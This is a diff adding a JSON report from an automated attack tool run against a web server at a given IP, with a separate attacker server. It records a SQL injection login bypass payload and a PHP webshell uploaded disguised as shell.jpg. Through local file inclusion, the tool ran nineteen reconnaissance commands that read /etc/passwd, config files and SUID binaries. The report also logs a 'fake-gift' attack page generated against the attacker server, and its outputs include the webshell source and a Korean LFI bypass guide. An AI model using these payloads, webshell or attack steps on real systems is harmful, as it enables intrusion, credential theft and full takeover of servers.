@@ -1,0 +1,222 @@
+{
+  "metadata": {
+    "target": "http://15.164.95.252",
+    "attacker_server": "http://13.158.67.78:5000",
+    "start_time": "2025-11-06 13:00:18",
+    "end_time": "2025-11-06 13:01:35",
+    "duration_seconds": 77,
+    "attacker_user_id": "1",
+    "tool_version": "2.0-evasion"
+  },
+  "summary": {
+    "total_vulnerabilities": 3,
+    "critical_count": 3,
+    "high_count": 0,
+    "vulnerability_breakdown": {
+      "sql_injection": 1,
+      "file_upload": 1,
+      "lfi": 1,
+      "xss": 0,
+      "csrf": 0
+    }
+  },
+  "vulnerabilities": {
+    "sql_injection": [
+      {
+        "url": "http://15.164.95.252/login.php",
+        "username": "admin",
+        "password": "' or '1'='1",
+        "description": "Single quote OR bypass without comment",
+        "impact": "CRITICAL - Authentication bypass, full account takeover",
+        "cvss_score": 9.8
+      }
+    ],
+    "xss": [],
+    "csrf": [],
+    "lfi": [
+      {
+        "url": "http://15.164.95.252/file.php",
+        "webshell": "shell.jpg",
+        "description": "Remote Code Execution via webshell - 19 commands executed",
+        "commands": [
+          {
+            "command": "whoami",
+            "description": "Current user",
+            "output": "apacheLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅file.php?name=/var/www/html/config.php ✅4. 웹쉘 실행 (업로드한 .php5 파일):file.php?name=shell.php5&cmd=whoami ✅file.php?name=shell.php5&cmd=ls -la ✅file.php?name=shell.php5&cmd=cat /etc/passwd ✅5. 민감한 파일 읽기:file.php?name=../../config.php (DB 정보)file.php?name=/var/log/apache2/access.log (로그)file.php?name=/home/ubuntu/.bash_history (명령 기록)"
+          },
+          {
+            "command": "id",
+            "description": "User ID and groups",
+            "output": "uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0LFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅file.php?name=/var/www/html/config.php ✅4. 웹쉘 실행 (업로드한 .php5 파일):file.php?name=shell.php5&cmd=whoami ✅file.php?name=shell.php5&cmd=ls -la ✅file.php?name=shell.php5&cmd=cat /etc/passwd ✅5. 민감한 파일 읽기:file.php?name=../../config.php (DB 정보)file.php?name=/var/log/apache2/access.log (로그)file.php?name=/home/ubuntu/.bash_history (명령 기록)"
+          },
+          {
+            "command": "pwd",
+            "description": "Current directory",
+            "output": "/var/www/html/wwwLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅file.php?name=/var/www/html/config.php ✅4. 웹쉘 실행 (업로드한 .php5 파일):file.php?name=shell.php5&cmd=whoami ✅file.php?name=shell.php5&cmd=ls -la ✅file.php?name=shell.php5&cmd=cat /etc/passwd ✅5. 민감한 파일 읽기:file.php?name=../../config.php (DB 정보)file.php?name=/var/log/apache2/access.log (로그)file.php?name=/home/ubuntu/.bash_history (명령 기록)"
+          },
+          {
+            "command": "ls -la",
+            "description": "Directory listing",
+            "output": "total 140\ndrwxr-xr-x. 3 ec2-user ec2-user 16384 Nov  6 12:39 .\ndrwxrwxrwx. 4 root     root        90 Nov  3 16:22 ..\n-rw-r--r--. 1 ec2-user ec2-user   536 Oct 27 06:20 add_comment.php\n-rw-r-----. 1 root     apache    1642 Nov  3 17:14 config.php\n-rw-r--r--. 1 root     root      1534 Nov  3 17:12 config.php.bak\n-rw-r--r--. 1 ec2-user ec2-user   817 Oct 27 06:22 download.php\n-rw-r--r--. 1 ec2-user ec2-user  7228 Oct 27 06:22 file.php\n-rw-rw-r--. 1 ec2-user ec2-user  9759 Nov  4 10:22 index.php\n-rw-r--r--. 1 ec2-user ec2-user   327 Oct 27 06:20 like_post.php\n-rw-rw-r--. 1 ec2-user ec2-user  8124 Nov  3 16:53 login.php\n-rw-r--r--. 1 ec2-user ec2-user    84 Oct 27 06:21 logout.php\n-rw-r--r--. 1 ec2-user ec2-user  6547 Nov  6 12:39 new_post.php\n-rw-r--r--. 1 ec2-user ec2-user 14432 Oct 27 06:21 profile.php\n-rw-r--r--. 1 ec2-user ec2-user  5898 Oct 27 06:18 register.php\n-rw-r--r--. 1 ec2-user ec2-user  5425 Oct 27 06:17 setup.php\n-rw-r--r--. 1 apache   apache     252 Nov  3 16:32 test_db.php\n"
+          },
+          {
+            "command": "cat /etc/passwd",
+            "description": "User accounts",
+            "output": "root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\nsystemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin\nsystemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin\nsystemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin\nrpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\nlibstoragemgmt:x:997:997:daemon account for libstoragemgmt:/:/usr/sbin/nologin\nsy"
+          },
+          {
+            "command": "cat /etc/group",
+            "description": "Group information",
+            "output": "root:x:0:\nbin:x:1:\ndaemon:x:2:\nsys:x:3:\nadm:x:4:ec2-user\ntty:x:5:\ndisk:x:6:\nlp:x:7:\nmem:x:8:\nkmem:x:9:\nwheel:x:10:ec2-user,hongjungsu\ncdrom:x:11:\nmail:x:12:\nman:x:15:\ndialout:x:18:\nfloppy:x:19:\ngames:x:20:\ntape:x:33:\nvideo:x:39:\nftp:x:50:\nlock:x:54:\naudio:x:63:\nusers:x:100:\nnobody:x:65534:\nutmp:x:22:\nutempter:x:35:\ndbus:x:81:\ninput:x:104:\nkvm:x:36:\nrender:x:105:\nsgx:x:106:\nsystemd-journal:x:190:ec2-user\nsystemd-network:x:192:\nsystemd-oom:x:999:\nsystemd-resolve:x:193:\nssh_keys:x:998:\nsshd:x:74:\nrpc:x:32:\nlibstoragemgmt:x:997:\nsystemd-coredump:x:996:\nsystemd-timesync:x:995:\nchrony:x:994:\nec2-instance-connect:x:993:\nstapusr:x:156:\nstapsys:x:157:\nstapdev:x:158:\nstapunpriv:x:159:stapunpriv\nrpcuser:x:29:\ntcpdump:x:72:\nscreen:x:84:\nec2-user:x:1000:\napache:x:48:\nsaslauth:x:76:\nsphinx:x:992:\nmysql:x:27:\nnginx:x:991:\nhongjungho:x:1001:\nhongjungsu:x:1002:\nsplunk:x:990:LFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd "
+          },
+          {
+            "command": "uname -a",
+            "description": "System information",
+            "output": "Linux ip-172-31-40-109.ap-northeast-2.compute.internal 6.1.155-176.282.amzn2023.x86_64 #1 SMP PREEMPT_DYNAMIC Tue Oct  7 15:53:25 UTC 2025 x86_64 x86_64 x86_64 GNU/LinuxLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅file.php?name=/var/www/html/config.php ✅4. 웹쉘 실행 (업로드한 .php5 파일):file.php?name=shell.php5&cmd=whoami ✅file.php?name=shell.php5&cmd=ls -la ✅file.php?name=shell.php5&cmd=cat /etc/passwd ✅5. 민감한 파일 읽기:file.php?name=../../config.php (DB 정보)file.php?name=/var/log/apache2/access.log (로그)file.php?name=/home/ubuntu/.bash_history (명령 기록)"
+          },
+          {
+            "command": "cat /etc/os-release",
+            "description": "OS version",
+            "output": "NAME=\"Amazon Linux\"\nVERSION=\"2023\"\nID=\"amzn\"\nID_LIKE=\"fedora\"\nVERSION_ID=\"2023\"\nPLATFORM_ID=\"platform:al2023\"\nPRETTY_NAME=\"Amazon Linux 2023.9.20251020\"\nANSI_COLOR=\"0;33\"\nCPE_NAME=\"cpe:2.3:o:amazon:amazon_linux:2023\"\nHOME_URL=\"https://aws.amazon.com/linux/amazon-linux-2023/\"\nDOCUMENTATION_URL=\"https://docs.aws.amazon.com/linux/\"\nSUPPORT_URL=\"https://aws.amazon.com/premiumsupport/\"\nBUG_REPORT_URL=\"https://github.com/amazonlinux/amazon-linux-2023\"\nVENDOR_NAME=\"AWS\"\nVENDOR_URL=\"https://aws.amazon.com/\"\nSUPPORT_END=\"2029-06-30\"LFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅file.php?name=/var/www/html/config.php ✅4. 웹쉘 실행 (업로드한 .php5 파일):file.php?name=shell.php5&cmd=whoami ✅file.php?name=shell.php5&cmd=ls -la ✅file.php?name=shell.php5&cmd=cat /etc/passwd ✅5. 민감한 파일 읽기:file.php?name=../../config.php (DB 정보)file."
+          },
+          {
+            "command": "env",
+            "description": "Environment variables",
+            "output": "PWD=/var/www/html/www\nHOME=/usr/share/httpd\nUSER=apache\nSHLVL=0\n_=/usr/bin/envLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅file.php?name=/var/www/html/config.php ✅4. 웹쉘 실행 (업로드한 .php5 파일):file.php?name=shell.php5&cmd=whoami ✅file.php?name=shell.php5&cmd=ls -la ✅file.php?name=shell.php5&cmd=cat /etc/passwd ✅5. 민감한 파일 읽기:file.php?name=../../config.php (DB 정보)file.php?name=/var/log/apache2/access.log (로그)file.php?name=/home/ubuntu/.bash_history (명령 기록)"
+          },
+          {
+            "command": "ps aux",
+            "description": "Running processes",
+            "output": "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.4 172436 17124 ?        Ss   09:36   0:02 /usr/lib/systemd/systemd --switched-root --system --deserialize=32\nroot           2  0.0  0.0      0     0 ?        S    09:36   0:00 [kthreadd]\nroot           3  0.0  0.0      0     0 ?        I<   09:36   0:00 [rcu_gp]\nroot           4  0.0  0.0      0     0 ?        I<   09:36   0:00 [rcu_par_gp]\nroot           5  0.0  0.0      0     0 ?        I<   09:36   0:00 [slub_flushwq]\nroot           6  0.0  0.0      0     0 ?        I<   09:36   0:00 [netns]\nroot           8  0.0  0.0      0     0 ?        I<   09:36   0:00 [kworker/0:0H-events_highpri]\nroot          10  0.0  0.0      0     0 ?        I<   09:36   0:00 [mm_percpu_wq]\nroot          11  0.0  0.0      0     0 ?        I    09:36   0:00 [rcu_tasks_kthread]\nroot          12  0.0  0.0      0     0 ?        I    09:36   0:00 [rcu_tasks_rude_kthread]\nroot          13  0.0  0.0      0     0 ? "
+          },
+          {
+            "command": "netstat -tulnp 2>/dev/null || ss -tulnp",
+            "description": "Network connections",
+            "output": "Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 127.0.0.1:44207         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:38205         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:46829         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:46797         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:36661         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:8065          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:44935         0.0."
+          },
+          {
+            "command": "find / -perm -4000 -type f 2>/dev/null",
+            "description": "SUID binaries (privilege escalation)",
+            "output": "/usr/bin/sudo\n/usr/bin/at\n/usr/bin/chage\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/su\n/usr/bin/mount\n/usr/bin/umount\n/usr/bin/staprun\n/usr/bin/passwd\n/usr/sbin/grub2-set-bootflag\n/usr/sbin/pam_timestamp_check\n/usr/sbin/unix_chkpwd\n/usr/sbin/mount.nfs\n/usr/lib64/mariadb/plugin/auth_pam_tool_dir/auth_pam_toolLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅file.php?name=/var/www/html/config.php ✅4. 웹쉘 실행 (업로드한 .php5 파일):file.php?name=shell.php5&cmd=whoami ✅file.php?name=shell.php5&cmd=ls -la ✅file.php?name=shell.php5&cmd=cat /etc/passwd ✅5. 민감한 파일 읽기:file.php?name=../../config.php (DB 정보)file.php?name=/var/log/apache2/access.log (로그)file.php?name=/home/ubuntu/.bash_history (명령 기록)"
+          },
+          {
+            "command": "sudo -l 2>/dev/null",
+            "description": "Sudo privileges",
+            "output": "if(isset($_GET[\"cmd\"])) {\n    echo \"\";\n    $cmd = $_GET[\"cmd\"];\n    if(function_exists('system')) {\n        system($cmd);\n    } elseif(function_exists('exec')) {\n        echo exec($cmd);\n    } elseif(function_exists('shell_exec')) {\n        echo shell_exec($cmd);\n    } elseif(function_exists('passthru')) {\n        passthru($cmd);\n    } else {\n        echo \"No execution function available\";\n    }\n    echo \"\";\n}"
+          },
+          {
+            "command": "cat /proc/version",
+            "description": "Kernel version",
+            "output": "Linux version 6.1.155-176.282.amzn2023.x86_64 (mockbuild@ip-10-0-42-236) (gcc (GCC) 11.5.0 20240719 (Red Hat 11.5.0-5), GNU ld version 2.41-50.amzn2023.0.4) #1 SMP PREEMPT_DYNAMIC Tue Oct  7 15:53:25 UTC 2025LFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅file.php?name=/var/www/html/config.php ✅4. 웹쉘 실행 (업로드한 .php5 파일):file.php?name=shell.php5&cmd=whoami ✅file.php?name=shell.php5&cmd=ls -la ✅file.php?name=shell.php5&cmd=cat /etc/passwd ✅5. 민감한 파일 읽기:file.php?name=../../config.php (DB 정보)file.php?name=/var/log/apache2/access.log (로그)file.php?name=/home/ubuntu/.bash_history (명령 기록)"
+          },
+          {
+            "command": "cat /etc/crontab",
+            "description": "Scheduled tasks",
+            "output": "SHELL=/bin/bash\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=root\n\n# For details see man 4 crontabs\n\n# Example of job definition:\n# .---------------- minute (0 - 59)\n# |  .------------- hour (0 - 23)\n# |  |  .---------- day of month (1 - 31)\n# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...\n# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\n# |  |  |  |  |\n# *  *  *  *  * user-name  command to be executedLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅file.php?name=/var/www/html/config.php ✅4. 웹쉘 실행 (업로드한 .php5 파일):file.php?name=shell.php5&cmd=whoami ✅file.php?name=shell.php5&cmd=ls -la ✅file.php?name=shell.php5&cmd=cat /etc/passwd ✅5. 민감한 파일 읽기:file.php?name=../../config.php (DB 정보)file.php?name=/var/log/apache2/access.log (로그)file.php?name=/home/ubuntu/.bash_histor"
+          },
+          {
+            "command": "ls -la /home",
+            "description": "User home directories",
+            "output": "total 16\ndrwxr-xr-x.  5 root       root          58 Oct 29 15:14 .\ndr-xr-xr-x. 18 root       root         237 Oct 22 06:12 ..\ndrwx------.  7 ec2-user   ec2-user   16384 Nov  4 10:49 ec2-user\ndrwx------.  3 hongjungho hongjungho    74 Oct 29 14:44 hongjungho\ndrwx------.  4 hongjungsu hongjungsu   128 Oct 31 09:41 hongjungsuLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅file.php?name=/var/www/html/config.php ✅4. 웹쉘 실행 (업로드한 .php5 파일):file.php?name=shell.php5&cmd=whoami ✅file.php?name=shell.php5&cmd=ls -la ✅file.php?name=shell.php5&cmd=cat /etc/passwd ✅5. 민감한 파일 읽기:file.php?name=../../config.php (DB 정보)file.php?name=/var/log/apache2/access.log (로그)file.php?name=/home/ubuntu/.bash_history (명령 기록)"
+          },
+          {
+            "command": "cat /var/www/html/config.php 2>/dev/null || cat /var/www/config.php 2>/dev/null",
+            "description": "Database credentials",
+            "output": "if(isset($_GET[\"cmd\"])) {\n    echo \"\";\n    $cmd = $_GET[\"cmd\"];\n    if(function_exists('system')) {\n        system($cmd);\n    } elseif(function_exists('exec')) {\n        echo exec($cmd);\n    } elseif(function_exists('shell_exec')) {\n        echo shell_exec($cmd);\n    } elseif(function_exists('passthru')) {\n        passthru($cmd);\n    } else {\n        echo \"No execution function available\";\n    }\n    echo \"\";\n}"
+          },
+          {
+            "command": "cat ../config.php",
+            "description": "Application config",
+            "output": "if(isset($_GET[\"cmd\"])) {\n    echo \"\";\n    $cmd = $_GET[\"cmd\"];\n    if(function_exists('system')) {\n        system($cmd);\n    } elseif(function_exists('exec')) {\n        echo exec($cmd);\n    } elseif(function_exists('shell_exec')) {\n        echo shell_exec($cmd);\n    } elseif(function_exists('passthru')) {\n        passthru($cmd);\n    } else {\n        echo \"No execution function available\";\n    }\n    echo \"\";\n}"
+          },
+          {
+            "command": "ls -la /var/www/html/uploads",
+            "description": "Uploads directory",
+            "output": "if(isset($_GET[\"cmd\"])) {\n    echo \"\";\n    $cmd = $_GET[\"cmd\"];\n    if(function_exists('system')) {\n        system($cmd);\n    } elseif(function_exists('exec')) {\n        echo exec($cmd);\n    } elseif(function_exists('shell_exec')) {\n        echo shell_exec($cmd);\n    } elseif(function_exists('passthru')) {\n        passthru($cmd);\n    } else {\n        echo \"No execution function available\";\n    }\n    echo \"\";\n}"
+          }
+        ],
+        "impact": "CRITICAL - Full system access, privilege escalation possible",
+        "cvss_score": 10.0
+      }
+    ],
+    "file_upload": [
+      {
+        "upload_url": "http://15.164.95.252/upload.php",
+        "filename": "shell.jpg",
+        "command": "whoami",
+        "output": "apacheLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. ",
+        "access_url": "http://15.164.95.252/file.php?name=shell.jpg&cmd={COMMAND}",
+        "access_method": "Via file.php LFI",
+        "impact": "CRITICAL - Remote Code Execution achieved",
+        "cvss_score": 10.0
+      }
+    ]
+  },
+  "attack_timeline": [
+    {
+      "timestamp": "2025-11-06 13:00:18",
+      "type": "SCAN_START",
+      "description": "Security assessment started on http://15.164.95.252",
+      "severity": "INFO",
+      "details": {}
+    },
+    {
+      "timestamp": "2025-11-06 13:00:25",
+      "type": "SQL_INJECTION",
+      "description": "Successfully bypassed authentication using SQL injection",
+      "severity": "CRITICAL",
+      "details": {
+        "payload": "username=admin, password=' or '1'='1",
+        "method": "Single quote OR bypass without comment",
+        "account": "admin",
+        "points": 0
+      }
+    },
+    {
+      "timestamp": "2025-11-06 13:00:33",
+      "type": "FILE_UPLOAD_RCE",
+      "description": "Successfully uploaded webshell: shell.jpg",
+      "severity": "CRITICAL",
+      "details": {
+        "filename": "shell.jpg",
+        "bypass_method": "JPG with .htaccess",
+        "access_method": "Via file.php LFI",
+        "test_command": "whoami",
+        "output": "apacheLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번"
+      }
+    },
+    {
+      "timestamp": "2025-11-06 13:01:18",
+      "type": "RCE",
+      "description": "Remote Code Execution achieved via shell.jpg",
+      "severity": "CRITICAL",
+      "details": {
+        "webshell": "shell.jpg",
+        "commands_executed": 19,
+        "recon_complete": true
+      }
+    },
+    {
+      "timestamp": "2025-11-06 13:01:35",
+      "type": "SETUP",
+      "description": "Generated fake-gift.html attack page",
+      "severity": "INFO",
+      "details": {
+        "filename": "reports/fake-gift.html",
+        "attacker_id": "1",
+        "attack_server": "http://13.158.67.78:5000"
+      }
+    },
+    {
+      "timestamp": "2025-11-06 13:01:35",
+      "type": "SCAN_COMPLETE",
+      "description": "Security assessment completed. 3 vulnerabilities found",
+      "severity": "INFO",
+      "details": {}
+    }
+  ],
+  "artifacts": {
+    "uploaded_webshell": "shell.jpg",
+    "fake_gift_page": "reports/fake-gift.html"
+  }
+}
